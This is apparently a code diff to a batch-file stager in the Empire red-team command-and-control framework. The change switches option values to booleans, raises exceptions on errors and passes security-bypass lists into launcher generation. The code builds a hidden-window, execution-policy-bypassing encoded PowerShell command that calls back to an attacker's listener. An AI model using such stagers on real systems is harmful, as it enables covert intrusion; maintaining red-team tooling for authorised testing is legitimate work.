@@ -1,9 +1,7 @@
-import logging
 from textwrap import dedent
 
 from empire.server.core.db.base import SessionLocal
-
-log = logging.getLogger(__name__)
+from empire.server.core.exceptions import StagerGenerationException
 
 
 class Stager:
@@ -42,16 +40,12 @@ class Stager:
             "Delete": {
                 "Description": "Delete .bat after running.",
                 "Required": False,
-                "Value": "True",
-                "SuggestedValues": ["True", "False"],
-                "Strict": True,
+                "Value": True,
             },
             "Obfuscate": {
                 "Description": "Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types.",
                 "Required": False,
-                "Value": "False",
-                "SuggestedValues": ["True", "False"],
-                "Strict": True,
+                "Value": False,
                 "DependsOn": [{"name": "Language", "values": ["powershell"]}],
             },
             "ObfuscateCommand": {
@@ -67,6 +61,7 @@ class Stager:
                 "Description": "Bypasses as a space separated list to be prepended to the launcher",
                 "Required": False,
                 "Value": "",
+                "BypassLanguage": "powershell",
             },
         }
 
@@ -82,13 +77,12 @@ class Stager:
         listener = self.mainMenu.listenersv2.get_by_name(SessionLocal(), listener_name)
         host = listener.options["Host"]["Value"]
 
-        obfuscate = options["Obfuscate"]["Value"].lower() == "true"
+        obfuscate = options["Obfuscate"]["Value"]
 
-        delete = options["Delete"]["Value"].lower() == "true"
+        delete = options["Delete"]["Value"]
 
         if not host:
-            log.error("[!] Error in launcher command generation.")
-            return ""
+            raise StagerGenerationException("Error in launcher command generation.")
 
         launcher = ""
         if listener.module == "http":
@@ -108,6 +102,7 @@ class Stager:
                     obfuscation_command=obfuscate_command,
                     encode=True,
                     listener_name=listener_name,
+                    bypasses=bypasses,
                 )
                 launcher = f"powershell.exe -nop -ep bypass -w 1 -enc {oneliner.split('-enc ')[1]}"
             elif language == "go":
@@ -117,6 +112,7 @@ class Stager:
                     obfuscation_command=obfuscate_command,
                     encode=True,
                     listener_name=listener_name,
+                    bypasses=bypasses,
                 )
 
         elif language == "powershell":
@@ -126,12 +122,19 @@ class Stager:
                 encode=True,
                 obfuscate=obfuscate,
                 obfuscation_command=obfuscate_command,
+                bypasses=bypasses,
+            )
+        else:
+            raise StagerGenerationException(
+                f"launcher_bat does not support Language={language} with a "
+                f"{listener.module} listener."
             )
 
         MAX_CHARACTERS = 8192
         if len(launcher) > MAX_CHARACTERS:
-            log.error("[!] Error: launcher code is greater than 8192 characters.")
-            return ""
+            raise StagerGenerationException(
+                "Launcher code is greater than 8192 characters."
+            )
 
         code = dedent(
             f"""
